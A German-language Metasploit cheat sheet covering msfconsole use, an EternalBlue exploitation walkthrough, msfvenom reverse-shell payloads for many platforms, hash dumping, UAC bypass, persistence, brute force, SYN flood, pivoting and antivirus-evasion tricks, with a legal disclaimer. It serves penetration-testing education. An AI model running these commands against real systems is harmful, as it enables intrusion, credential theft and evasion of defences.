# 🔴 Metasploit Framework – vollständiger Spickzettel

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
                                   ___          ____
                               ,-""   `.      < HACK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _.--.__    /   ;
 (`._    _.-""       "--'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'
```

![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge&logo=metasploit)
![Kali Linux](https://img.shields.io/badge/Kali-Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Offensive Security](https://img.shields.io/badge/Offensive-Security-red?style=for-the-badge)
![Lizenz](https://img.shields.io/badge/License-BSD--3-green?style=for-the-badge)

> **Das weltweit meistgenutzte Framework für Penetrationstests** - Ein umfassender Leitfaden für den Umgang mit Metasploit

---

## 📋 Inhaltsverzeichnis

- [Einführung](#-einführung)
- [Installation](#-installation)
- [Architekturübersicht](#-architekturübersicht)
- [Metasploit starten](#-metasploit-starten)
- [Grundlegende Befehle](#-grundlegende-befehle)
- [Modultypen](#-modultypen)
- [Ablauf der Ausnutzung](#-ablauf-der-ausnutzung)
- [Datenbankintegration](#-datenbankintegration)
- [Scans und Enumeration](#-scans-und-enumeration)
- [Payload-Erzeugung (msfvenom)](#-payload-erzeugung-msfvenom)
- [Post-Exploitation](#-post-exploitation)
- [Hilfsmodule (Auxiliary)](#-hilfsmodule-auxiliary)
- [Praxisbeispiele](#-praxisbeispiele)
- [Tabellen zum Nachschlagen](#-tabellen-zum-nachschlagen)
- [Tipps und bewährte Vorgehensweisen](#-tipps-und-bewährte-vorgehensweisen)
- [Ressourcen](#-ressourcen)

---

## 🎯 Einführung

**Metasploit Framework** ist eine quelloffene Plattform für Penetrationstests und die Entwicklung von Exploits. Sie bietet:

- 🔍 **Informationsbeschaffung** und Schwachstellenscans
- 💉 **Exploit-Entwicklung** und Bereitstellung
- 🎭 **Payload-Erzeugung** für verschiedene Plattformen
- 🔐 Werkzeuge und Techniken für **Post-Exploitation**
- 📊 **Berichterstellung** und Dokumentationsmöglichkeiten

### Wichtige Bestandteile

| Bestandteil | Beschreibung |
|-----------|-------------|
| `msfconsole` | Zentrale Kommandozeilenoberfläche |
| `msfvenom` | Payload-Generator und Encoder |
| `msfdb` | Werkzeug zur Datenbankverwaltung |
| `msfrpcd` | RPC-Dienst für Fernzugriff |

---

## 📥 Installation

### Kali Linux (vorinstalliert)
```bash
# Metasploit aktualisieren
sudo apt update && sudo apt install metasploit-framework
```

### Ubuntu/Debian
```bash
# Abhängigkeiten installieren
sudo apt install curl gnupg2 software-properties-common

# Metasploit-Paketquelle hinzufügen
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

### Docker
```bash
docker pull metasploitframework/metasploit-framework
docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
```

### Windows (laut Original nicht für den Produktivbetrieb empfohlen)
```powershell
# Installationsprogramm herunterladen von: https://windows.metasploit.com/
# Installationsprogramm ausführen und den Anweisungen folgen
```

---

<a name="-architekturübersicht"></a>

## 🏗️ Architekturübersicht

```
┌────────────────────────────────────────────────────────┐
│                    METASPLOIT FRAMEWORK                │
├────────────────────────────────────────────────────────┤
│                                                        │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐│
│  │ EXPLOITS │  │ PAYLOADS │  │AUXILIARY │  │   POST   ││
│  │  (~2000) │  │  (~500)  │  │  (~1000) │  │  (~400)  ││
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘│
│                                                        │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐│
│  │ ENCODERS │  │   NOPS   │  │ EVASION  │  │ PLUGINS  ││
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘│
│                                                        │
├────────────────────────────────────────────────────────┤
│                      SCHNITTSTELLEN                    │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐│
│  │msfconsole│  │ Armitage │  │   API    │  │   RPC    ││
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘│
├────────────────────────────────────────────────────────┤
│                 DATENBANK (PostgreSQL)                 │
└────────────────────────────────────────────────────────┘
```

### Verzeichnisstruktur
```
/usr/share/metasploit-framework/
├── modules/
│   ├── exploits/      # Module zur Ausnutzung von Schwachstellen
│   ├── payloads/      # Payload-Module
│   ├── auxiliary/     # Scans, Fuzzing usw.
│   ├── post/          # Post-exploitation
│   ├── encoders/      # Payload-Encoder
│   ├── nops/          # NOP-Generatoren
│   └── evasion/       # Module zur Umgehung von Virenschutz
├── tools/             # Zusätzliche Werkzeuge
├── scripts/           # Meterpreter-Skripte
├── data/              # Wortlisten, Vorlagen
└── plugins/           # Konsolen-Plugins
```

---

## 🚀 Metasploit starten

### Datenbank initialisieren (beim ersten Start)
```bash
# PostgreSQL-Dienst starten
sudo systemctl start postgresql

# Datenbank initialisieren
sudo msfdb init

# Datenbankstatus prüfen
sudo msfdb status
```

### msfconsole starten
```bash
# Normaler Start
msfconsole

# Stiller Modus (ohne Banner)
msfconsole -q

# Befehle beim Start ausführen
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100"

# Resource-Datei laden
msfconsole -r commands.rc
```

---

<a name="-grundlegende-befehle"></a>

## ⌨️ Grundlegende Befehle

### Navigation und Hilfe

| Befehl | Beschreibung |
|---------|-------------|
| `help` oder `?` | Hilfemenü anzeigen |
| `help <command>` | Hilfe zu einem bestimmten Befehl |
| `search <term>` | Module nach Name, CVE oder Plattform suchen |
| `use <module>` | Modul auswählen |
| `back` | Aktuelles Modul verlassen |
| `info` | Modulinformationen anzeigen |
| `show options` | Moduloptionen anzeigen |
| `show advanced` | Erweiterte Optionen anzeigen |
| `show payloads` | Kompatible Payloads auflisten |
| `show targets` | Verfügbare Ziele auflisten |

### Modul konfigurieren

```bash
# Optionen setzen
set RHOSTS 192.168.1.100          # Ziel-IP-Adresse
set RPORT 445                      # Zielport
set LHOST 192.168.1.50            # Lokale IP-Adresse (Angreifer)
set LPORT 4444                     # Lokaler Port (Listener)
set PAYLOAD windows/meterpreter/reverse_tcp

# Global setzen (gilt über Modulwechsel hinweg)
setg RHOSTS 192.168.1.100
setg LHOST 192.168.1.50

# Optionen zurücksetzen
unset RHOSTS
unsetg LHOST

# Aktuelle Einstellungen prüfen
show options
check                              # Prüfen, ob das Ziel verwundbar ist
```

### Ausführung

```bash
# Exploit ausführen
exploit
run

# Im Hintergrund ausführen
exploit -j

# Mit bestimmten Optionen ausführen
exploit -z                         # Nach erfolgreicher Ausführung nicht mit der Sitzung interagieren
```

### Sitzungsverwaltung

```bash
# Sitzungen auflisten
sessions
sessions -l

# Mit einer Sitzung interagieren
sessions -i 1

# Sitzung beenden
sessions -k 1

# Alle Sitzungen beenden
sessions -K

# Shell zu einer Meterpreter-Sitzung erweitern
sessions -u 1

# Befehl in allen Sitzungen ausführen
sessions -c "sysinfo"
```

---

## 📦 Modultypen

### 1. Exploits
Module, die Schwachstellen ausnutzen.

```bash
# Nach Exploits suchen
search type:exploit platform:windows

# Beispiel
use exploit/windows/smb/ms17_010_eternalblue
```

### 2. Payloads
Code, der nach erfolgreicher Ausnutzung ausgeführt wird.

**Arten:**
- **Singles** - Eigenständige Payloads
- **Stagers** - Verbindung zwischen Angreifer und Ziel herstellen
- **Stages** - Werden von Stagern nachgeladen (Meterpreter)

```bash
# Payloads auflisten
show payloads

# Benennung von Payloads
<platform>/<arch>/<type>/<connection>
# Beispiel: windows/x64/meterpreter/reverse_tcp
```

### 3. Auxiliary
Scans, Fuzzing, Mitschneiden von Datenverkehr und mehr.

```bash
search type:auxiliary
use auxiliary/scanner/portscan/tcp
```

### 4. Post
Module für Aktionen nach dem Erstzugang.

```bash
search type:post platform:windows
use post/windows/gather/hashdump
```

### 5. Encoders
Payloads kodieren, um laut Vorlage die Erkennung zu umgehen.

```bash
show encoders
# Beispiel: x86/shikata_ga_nai
```

---

## 🎯 Ablauf der Ausnutzung

```
┌──────────────────────────────┐
│  Erkundung und Enumeration   │
└──────────────────────────────┘
                │
                ▼
┌──────────────────────────────┐
│       Modul auswählen        │
└──────────────────────────────┘
                │
                ▼
┌──────────────────────────────┐
│    Optionen konfigurieren    │
└──────────────────────────────┘
                │
                ▼
┌──────────────────────────────┐
│         Ziel prüfen          │
└──────────────────────────────┘
                │
                ▼
┌──────────────────────────────┐
│        Ziel ausnutzen        │
└──────────────────────────────┘
                │
                ▼
┌──────────────────────────────┐
│      Post-Exploitation       │
└──────────────────────────────┘
```

### Schrittweises Beispiel

```bash
# 1. Nach einem Exploit suchen
msf6 > search eternalblue

# 2. Modul auswählen
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 3. Optionen anzeigen
msf6 exploit(ms17_010_eternalblue) > show options

# 4. Ziel setzen
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# 5. Payload setzen
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 6. Listener konfigurieren
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444

# 7. Verwundbarkeit prüfen (optional)
msf6 exploit(ms17_010_eternalblue) > check

# 8. Ausführen
msf6 exploit(ms17_010_eternalblue) > exploit
```

---

<a name="-datenbankintegration"></a>

## 🗄️ Datenbankintegration

### Einrichtung und Verbindung

```bash
# Datenbank initialisieren
msfdb init

# Mit der Datenbank verbinden
db_connect msf:password@127.0.0.1/msf

# Status prüfen
db_status

# Verbindung trennen
db_disconnect
```

### Verwaltung der Arbeitsbereiche

```bash
# Arbeitsbereiche auflisten
workspace

# Arbeitsbereich erstellen
workspace -a pentest_project

# Arbeitsbereich wechseln
workspace pentest_project

# Arbeitsbereich löschen
workspace -d old_project

# Arbeitsbereich umbenennen
workspace -r old_name new_name
```

### Host-Verwaltung

```bash
# Hosts auflisten
hosts

# Host manuell hinzufügen
hosts -a 192.168.1.100

# Host löschen
hosts -d 192.168.1.100

# Nach Hosts suchen
hosts -S windows

# Hosts exportieren
hosts -o /tmp/hosts.csv
```

### Dienstverwaltung

```bash
# Dienste auflisten
services

# Nach Port filtern
services -p 80,443

# Nach Dienstname filtern
services -s http

# Nach Diensten suchen
services -S microsoft
```

### Verwaltung der Schwachstellen

```bash
# Schwachstellen auflisten
vulns

# Schwachstelle hinzufügen
vulns -a 192.168.1.100 -n "MS17-010"
```

### Import/Export

```bash
# Nmap-Scan importieren
db_import /path/to/nmap_scan.xml

# Nessus-Scan importieren
db_import /path/to/nessus_scan.nessus

# Nmap direkt ausführen
db_nmap -sV -O 192.168.1.0/24

# Daten exportieren
hosts -o hosts.csv
services -o services.csv
```

---

## 🔍 Scans und Enumeration

### Portscans

```bash
# TCP-SYN-Scan
use auxiliary/scanner/portscan/syn
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
run

# TCP-Connect-Scan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.100
set PORTS 1-65535
set THREADS 50
run
```

### Enumeration von Diensten

```bash
# SMB-Enumeration
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

# SMB-Freigaben
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.100
run

# SSH-Version
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.0/24
run

# HTTP-Version
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.1.0/24
run

# FTP-Enumeration
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.0/24
run
```

### Schwachstellenscans

```bash
# SMB MS17-010 (EternalBlue)
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# HTTP-Schwachstellenscanner
use auxiliary/scanner/http/http_vuln_cve_2021_26855
set RHOSTS 192.168.1.100
run
```

---

## 💉 Payload-Erzeugung (msfvenom)

### Grundsyntax
```bash
msfvenom -p <PAYLOAD> <OPTIONS> -f <FORMAT> -o <OUTPUT>
```

### Häufige Optionen

| Option | Beschreibung |
|--------|-------------|
| `-p` | Zu verwendende Payload |
| `-f` | Ausgabeformat |
| `-o` | Ausgabedatei |
| `-e` | Zu verwendender Encoder |
| `-i` | Anzahl der Kodierungsdurchläufe |
| `-b` | Zu vermeidende problematische Zeichen |
| `-n` | Größe des NOP-Sleds |
| `--platform` | Zielplattform |
| `-a` | Architektur |
| `LHOST` | IP-Adresse des Listeners |
| `LPORT` | Port des Listeners |

### Windows-Payloads

```bash
# Reverse TCP (Meterpreter)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# Reverse TCP (x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell64.exe

# Reverse HTTPS (verschlüsselt)
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe -o shell_https.exe

# Bind TCP
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind_shell.exe

# Mit Kodierung (laut Vorlage zur AV-Umgehung)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
```

### Linux-Payloads

```bash
# Reverse TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell

# Reverse TCP (x64)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell64

# Bind Shell
msfvenom -p linux/x86/shell/bind_tcp LPORT=4444 -f elf -o bind_shell
```

### Web-Payloads

```bash
# PHP-Reverse-Shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# ASP-Reverse-Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp

# ASPX-Reverse-Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f aspx -o shell.aspx

# JSP-Reverse-Shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp

# WAR-Datei
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
```

### Payloads für Skriptsprachen

```bash
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.py

# PowerShell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh -o shell.ps1

# VBA (Makro)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f vba -o shell.vba

# HTA
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f hta-psh -o shell.hta
```

### Android-Payloads

```bash
# Android-Reverse-TCP
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o app.apk
```

### macOS-Payloads

```bash
# macOS-Reverse-TCP
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o shell
```

### Multi/Handler einrichten

```bash
# Listener starten
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

---

## 🔓 Post-Exploitation

### Grundlegende Post-Module

```bash
# Systeminformationen abrufen
use post/windows/gather/enum_system

# Angemeldete Benutzer ermitteln
use post/windows/gather/enum_logged_on_users

# Passwort-Hashes auslesen
use post/windows/gather/hashdump

# Zugangsdaten aus dem Arbeitsspeicher
use post/windows/gather/credentials/credential_collector

# Auf virtuelle Maschine prüfen
use post/windows/gather/checkvm
```

### Rechteausweitung

```bash
# Vorschläge zur Rechteausweitung unter Windows
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# UAC-Umgehung
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# SYSTEM-Rechte erlangen
use post/windows/escalate/getsystem
```

### Persistenz

```bash
# Persistenz über die Registry
use exploit/windows/local/persistence_service
set SESSION 1
run

# Persistenz über geplante Aufgaben
use post/windows/manage/persistence_exe
set SESSION 1
set STARTUP SYSTEM
run
```

---

## 🔧 Hilfsmodule (Auxiliary)

### Brute Force

```bash
# SSH-Brute-Force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run

# SMB-Brute-Force
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set SMBUser administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# FTP-Brute-Force
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USERNAME anonymous
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### Mitschneiden von Datenverkehr

```bash
# HTTP-Passwort-Sniffer
use auxiliary/sniffer/psnuffle
run

# Pakete aufzeichnen
use auxiliary/sniffer/capture
set INTERFACE eth0
run
```

### DoS (nur zu Testzwecken)

```bash
# SYN-Flood
use auxiliary/dos/tcp/synflood
set RHOSTS 192.168.1.100
set RPORT 80
run
```

---

## 🎬 Praxisbeispiele

### Beispiel 1: EternalBlue-Angriff (MS17-010)

```bash
# Metasploit starten
msfconsole -q

# Nach einem Exploit suchen
search eternalblue

# Exploit auswählen
use exploit/windows/smb/ms17_010_eternalblue

# Konfigurieren
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444

# Auf Verwundbarkeit prüfen
check

# Exploit
exploit
```

### Beispiel 2: Angriff auf eine Webanwendung

```bash
# Nach Schwachstellen suchen
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run

# Datei-Upload ausnutzen
use exploit/multi/http/php_file_upload
set RHOSTS 192.168.1.100
set TARGETURI /uploads/
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

### Beispiel 3: Multi-Handler mit msfvenom

```bash
# Terminal 1: Payload erzeugen
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# Terminal 2: Handler starten
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j

# payload.exe auf das Ziel übertragen und ausführen
# Die Sitzung verbindet sich mit dem Handler
```

### Beispiel 4: Pivoting über einen kompromittierten Host

```bash
# Nach dem Aufbau einer Meterpreter-Sitzung
meterpreter > run autoroute -s 10.10.10.0/24

# Alternativ aus msfconsole
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.10.10.0
run

# Jetzt das interne Netzwerk scannen
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,445
run
```

---

## 📊 Tabellen zum Nachschlagen

### Wichtige Befehle

| Befehl | Beschreibung |
|---------|-------------|
| `search <term>` | Nach Modulen suchen |
| `use <module>` | Modul auswählen |
| `show options` | Optionen anzeigen |
| `set <opt> <val>` | Optionswert setzen |
| `exploit` / `run` | Modul ausführen |
| `back` | Zur Hauptansicht zurückkehren |
| `sessions -l` | Sitzungen auflisten |
| `sessions -i <id>` | Mit einer Sitzung interagieren |

### Häufige Payloads

| Payload | Beschreibung |
|---------|-------------|
| `windows/meterpreter/reverse_tcp` | Windows-Meterpreter (32 Bit) |
| `windows/x64/meterpreter/reverse_tcp` | Windows-Meterpreter (64 Bit) |
| `windows/meterpreter/reverse_https` | Verschlüsselte Verbindung |
| `linux/x86/meterpreter/reverse_tcp` | Linux-Meterpreter |
| `php/meterpreter/reverse_tcp` | PHP-Meterpreter |
| `java/jsp_shell_reverse_tcp` | Java-/JSP-Shell |
| `android/meterpreter/reverse_tcp` | Android-Meterpreter |

### Ausgabeformate (msfvenom)

| Format | Dateiendung | Verwendung |
|--------|-----------|----------|
| `exe` | .exe | Ausführbare Windows-Datei |
| `elf` | (keine) | Ausführbare Linux-Datei |
| `macho` | (keine) | Ausführbare macOS-Datei |
| `raw` | unterschiedlich | Roher Shellcode |
| `asp` | .asp | IIS-Webserver |
| `aspx` | .aspx | .NET-Webserver |
| `php` | .php | PHP-Webserver |
| `jsp` | .jsp | Java-Webserver |
| `war` | .war | Bereitstellung für Tomcat |
| `psh` | .ps1 | PowerShell-Skript |
| `vba` | .vba | Office-Makro |
| `dll` | .dll | Windows-Bibliothek |

### Häufig verwendete Encoder

| Encoder | Beschreibung |
|---------|-------------|
| `x86/shikata_ga_nai` | Polymorpher XOR-Encoder |
| `x64/xor` | XOR-Encoder (64 Bit) |
| `x86/alpha_mixed` | Alphanumerischer Encoder |
| `php/base64` | Base64-Encoder für PHP |

---

## 💡 Tipps und bewährte Vorgehensweisen

### ⚠️ Rechtlicher Hinweis
> **WICHTIG:** Metasploit nur gegen eigene Systeme oder mit ausdrücklicher schriftlicher Testgenehmigung einsetzen. Unbefugter Zugriff auf Computersysteme ist rechtswidrig.

### Hinweise zur Leistung

1. **Datenbank verwenden**
   ```bash
   # Datenbank immer initialisieren und verwenden
   msfdb init
   db_status
   ```

2. **Arbeitsbereiche verwenden**
   ```bash
   workspace -a client_pentest
   ```

3. **Resource-Skripte**
   ```bash
   # Befehle in einer .rc-Datei speichern
   echo "use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.50
   set LPORT 4444
   exploit -j" > handler.rc
   
   # Skript ausführen
   msfconsole -r handler.rc
   ```

4. **Threads mit Bedacht verwenden**
   ```bash
   set THREADS 10  # Das Ziel nicht überlasten
   ```

### Techniken zur Umgehung der Erkennung

1. **Mehrfache Kodierung**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe
   ```

2. **Eigene Vorlagen**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -x /path/to/legitimate.exe -f exe
   ```

3. **HTTPS-Payloads verwenden**
   ```bash
   set PAYLOAD windows/meterpreter/reverse_https
   ```

### Fehlerbehebung

| Problem | Lösung |
|-------|----------|
| Keine Datenbankverbindung | `msfdb reinit` |
| Modul wird nicht geladen | `reload_all` |
| Sitzung bricht sofort ab | Virenschutz prüfen, kodierte Payload verwenden |
| Exploit schlägt fehl | Betriebssystemversion des Ziels prüfen, andere Zielkonfiguration versuchen |

---

## 📚 Ressourcen

### Offizielle Dokumentation
- [Metasploit-Dokumentation](https://docs.metasploit.com/)
- [Rapid7 Blog](https://www.rapid7.com/blog/)
- [Metasploit GitHub](https://github.com/rapid7/metasploit-framework)

### Lernmaterial
- [Offensive Security](https://www.offensive-security.com/)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

### Spickzettel
- [SANS Metasploit Cheatsheet](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)
- [Meterpreter-Spickzettel](./Meterpreter.de.md)

---

## 📄 Lizenz

Dieser Spickzettel dient ausschließlich Lernzwecken. Verantwortungsbewusst und ethisch handeln.

---

<p align="center">
  <b>Viel Erfolg beim Hacken! 🔴</b><br>
  <i>Denke daran: Große Macht bringt große Verantwortung mit sich</i>
</p>

---

## Hinweise zur deutschen Ausgabe

> **Begriffe:** Ein *Exploit* nutzt eine Schwachstelle aus; eine *Payload* ist der dabei ausgeführte Code. Ein *Stager* lädt eine weitere Stufe nach. *Enumeration* bezeichnet das systematische Ermitteln von Informationen, *Pivoting* die Nutzung eines erreichbaren Systems als Zwischenstation. Die englischen Modulklassen im Architekturdiagramm sind originale Framework-Bezeichnungen; die ungefähren Modulzahlen sind historische Beispielwerte.

> **Kodierung und Versionen:** Encoder vermeiden insbesondere problematische Zeichen in Exploits; mehrfache Kodierung oder HTTPS garantieren keine AV-/EDR-Umgehung. Payload-Architektur, Plattform, Transport und Handler müssen zusammenpassen. Nicht jeder Modulname, jede Option oder jedes historische Beispiel ist in allen Framework-Versionen verfügbar. [Rapid7: Encoder-Grenzen](https://docs.rapid7.com/metasploit/encoded-payloads-bypassing-anti-virus/), [Rapid7: Payload-Aufbau](https://docs.metasploit.com/docs/using-metasploit/basics/how-payloads-work.html).

> **Ablauf und Kontext:** Mit `bash` markierte Beispiele enthalten häufig Befehle für msfconsole oder Meterpreter und sind keine direkt ausführbaren Bash-Skripte. `check` wird nicht von jedem Modul unterstützt und beweist keine allgemeine Sicherheit oder Verwundbarkeit. Das pauschale Beispiel `sessions -c "sysinfo"` ist vom Sitzungstyp und Befehlsinterpreter abhängig; `sysinfo` ist ein Meterpreter-Befehl. `msfdb reinit` kann bestehende Datenbankinhalte neu initialisieren und ist keine harmlose allgemeine Verbindungsreparatur. [Rapid7: Datenbankverwaltung](https://docs.metasploit.com/docs/using-metasploit/intermediate/metasploit-database-support.html). Arbeitsbereiche trennen gespeicherte Ergebnisse, nicht automatisch Netzwerke oder Berechtigungen.
